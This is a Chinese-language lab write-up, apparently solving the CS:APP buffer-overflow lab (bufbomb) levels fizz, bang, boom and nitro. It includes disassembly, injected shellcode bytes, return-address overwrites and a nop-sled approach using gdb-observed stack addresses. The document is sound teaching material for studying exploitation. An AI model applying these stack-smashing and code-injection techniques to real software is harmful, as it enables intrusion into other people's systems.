`fizz`

`fizz()`需要将`makecookie`产生的`cookie`作为参数传入。

```
$./makecookie U202215559
0x26e03bce
```

```asm6502
080491ec <getbuf>:
 80491ec:    55                       push   %ebp
 80491ed:    89 e5                    mov    %esp,%ebp
 80491ef:    83 ec 38                 sub    $0x38,%esp
 80491f2:    8d 45 d8                 lea    -0x28(%ebp),%eax
 80491f5:    89 04 24                 mov    %eax,(%esp)
 80491f8:    e8 55 fb ff ff           call   8048d52 <Gets>
 80491fd:    b8 01 00 00 00           mov    $0x1,%eax
 8049202:    c9                       leave  
 8049203:    c3                       ret   
```

```asm6502
08048cba <fizz>:
 8048cba:    55                       push   %ebp
 8048cbb:    89 e5                    mov    %esp,%ebp
 8048cbd:    83 ec 18                 sub    $0x18,%esp
 8048cc0:    8b 45 08                 mov    0x8(%ebp),%eax
 8048cc3:    3b 05 20 c2 04 08        cmp    0x804c220,%eax
 8048cc9:    75 1e                    jne    8048ce9 <fizz+0x2f>
 8048ccb:    89 44 24 04              mov    %eax,0x4(%esp)
 8048ccf:    c7 04 24 2e a1 04 08     movl   $0x804a12e,(%esp)
 8048cd6:    e8 f5 fb ff ff           call   80488d0 <printf@plt>
 8048cdb:    c7 04 24 01 00 00 00     movl   $0x1,(%esp)
 8048ce2:    e8 5d 06 00 00           call   8049344 <validate>
 8048ce7:    eb 10                    jmp    8048cf9 <fizz+0x3f>
 8048ce9:    89 44 24 04              mov    %eax,0x4(%esp)
 8048ced:    c7 04 24 c4 a2 04 08     movl   $0x804a2c4,(%esp)
 8048cf4:    e8 d7 fb ff ff           call   80488d0 <printf@plt>
 8048cf9:    c7 04 24 00 00 00 00     movl   $0x0,(%esp)
 8048d00:    e8 8b fc ff ff           call   8048990 <exit@plt>
```

我们首先将返回地址改为`08048cba`，即`fizz()`的首地址。

观察`fizz()`函数，我们可以判断出`fizz()`接受的参数储存在栈上，在`0x8048cc0`处，这个参数的地址是`0x8(%ebp)`，即调用的`getbuf()`的返回地址所在地址`+0x8`，只需要在这个位置注入我们的`cookie`即可。

`bang`

通过`gdb`我们可以得知`global_value`的地址为`0x804c218`，`bang()`的地址为`0x8048d05`。编写代码如下:

```asm6502
00000000 <.text>:
   0:    b8 ce 3b e0 26           mov    $0x26e03bce,%eax
   5:    a3 18 c2 04 08           mov    %eax,0x804c218
   a:    68 05 8d 04 08           push   $0x8048d05
   f:    c3                       ret    
```

我们得到了攻击代码，接下来我们通过将代码注入到缓存区，使程序跳转到我们的攻击代码。

现在的问题在于，我们应该将代码放在哪里呢？

通过`gdb`我们可以知道，我们输入的字符串首地址为`0x55683298`，不妨就放在这里吧！

`boom`

将攻击代码存储在字符串这块空间内。先将`getbuf`的返回地址改为攻击代码的首地址。在攻击代码中我们要将`%eax` 改为`0x26e03bce`，使得`getbuf` 返回正确的cookie。接着我们要还原栈状态和寄存器状态，将`%ebp` 改为`0x556832c0`，压入原本的返回地址`0x8048e81`和原本存入的`%ebp`值`0x556832f0`。

万事俱备，我们开始编写攻击代码。

```asm6502
00000000 <.text>:
   0:    b8 ce 3b e0 26           mov    $0x26e03bce,%eax
   5:    bd c0 32 68 55           mov    $0x556832c0,%ebp
   a:    68 81 8e 04 08           push   $0x8048e81
   f:    68 f0 32 68 55           push   $0x556832f0
  14:    c9                       leave  
  15:    c3                       ret    
```

如`bang`中所做的那样，将攻击代码注入到缓存区即可。

`nitro`

```asm6502
08049204 <getbufn>:
 8049204:    55                       push   %ebp
 8049205:    89 e5                    mov    %esp,%ebp
 8049207:    81 ec 18 02 00 00        sub    $0x218,%esp
 804920d:    8d 85 f8 fd ff ff        lea    -0x208(%ebp),%eax
 8049213:    89 04 24                 mov    %eax,(%esp)
 8049216:    e8 37 fb ff ff           call   8048d52 <Gets>
 804921b:    b8 01 00 00 00           mov    $0x1,%eax
 8049220:    c9                       leave  
 8049221:    c3                       ret    
 8049222:    90                       nop
 8049223:    90                       nop
```

可知`buf`的起始位置为`-0x208(%ebp)`，要覆盖该函数的返回地址，我们写入`0x208+0x4+0x4 = 528`个字节即可。

```asm6502
08048e01 <testn>:
 8048e01:    55                       push   %ebp
 8048e02:    89 e5                    mov    %esp,%ebp
 8048e04:    53                       push   %ebx
 8048e05:    83 ec 24                 sub    $0x24,%esp
 8048e08:    e8 da ff ff ff           call   8048de7 <uniqueval>
 8048e0d:    89 45 f4                 mov    %eax,-0xc(%ebp)
 8048e10:    e8 ef 03 00 00           call   8049204 <getbufn>
 8048e15:    89 c3                    mov    %eax,%ebx
 8048e17:    e8 cb ff ff ff           call   8048de7 <uniqueval>
 8048e1c:    8b 55 f4                 mov    -0xc(%ebp),%edx
 8048e1f:    39 d0                    cmp    %edx,%eax
 8048e21:    74 0e                    je     8048e31 <testn+0x30>
 8048e23:    c7 04 24 0c a3 04 08     movl   $0x804a30c,(%esp)
 8048e2a:    e8 41 fb ff ff           call   8048970 <puts@plt>
 8048e2f:    eb 36                    jmp    8048e67 <testn+0x66>
 8048e31:    3b 1d 20 c2 04 08        cmp    0x804c220,%ebx
 8048e37:    75 1e                    jne    8048e57 <testn+0x56>
 8048e39:    89 5c 24 04              mov    %ebx,0x4(%esp)
 8048e3d:    c7 04 24 38 a3 04 08     movl   $0x804a338,(%esp)
 8048e44:    e8 87 fa ff ff           call   80488d0 <printf@plt>
 8048e49:    c7 04 24 04 00 00 00     movl   $0x4,(%esp)
 8048e50:    e8 ef 04 00 00           call   8049344 <validate>
 8048e55:    eb 10                    jmp    8048e67 <testn+0x66>
 8048e57:    89 5c 24 04              mov    %ebx,0x4(%esp)
 8048e5b:    c7 04 24 6a a1 04 08     movl   $0x804a16a,(%esp)
 8048e62:    e8 69 fa ff ff           call   80488d0 <printf@plt>
 8048e67:    83 c4 24                 add    $0x24,%esp
 8048e6a:    5b                       pop    %ebx
 8048e6b:    5d                       pop    %ebp
 8048e6c:    c3                       ret    
```

通过该函数我们该知道从`getbufn`返回后应返回的地址为`8048e15`

且此时`%ebp`中的值为`0x28(%esp)`，那么我们写出汇编代码：

```asm6502
00000000 <.text>:
   0:    b8 ce 3b e0 26           mov    $0x26e03bce,%eax
   5:    8d 6c 24 28              lea    0x28(%esp),%ebp
   9:    68 15 8e 04 08           push   $0x8048e15
   e:    c3                       ret    ret 
```

接下来构建二进制攻击字符串，长度为528，利用nopsled的攻击方法，在真正的攻击代码之前全部填入nop指令。

![](C:\Users\abc\AppData\Roaming\marktext\images\2024-04-02-11-27-02-image.png)

现在的问题在于我们应跳转到哪里？

我们进入`gdb`，使用`-n -u U202215559`参数运行`bufbomb`，在`getbufn`开头打下断点，观察`esp`的值。

```
0x556832c4 
0x55683284
0x55683304
0x556832d4
0x55683284
```

以相同参数运行一次，可以发现每次的`esp`值相同，可见对于每个参数，栈地址每次随机的值相同。我们直接选择地址最高的一个来算即可。即`0x55683304`

选择一个合适的地址即可，此处答案并不唯一，比如我选择的是`0x5568 30f8`

至此，本次试验全部完成！

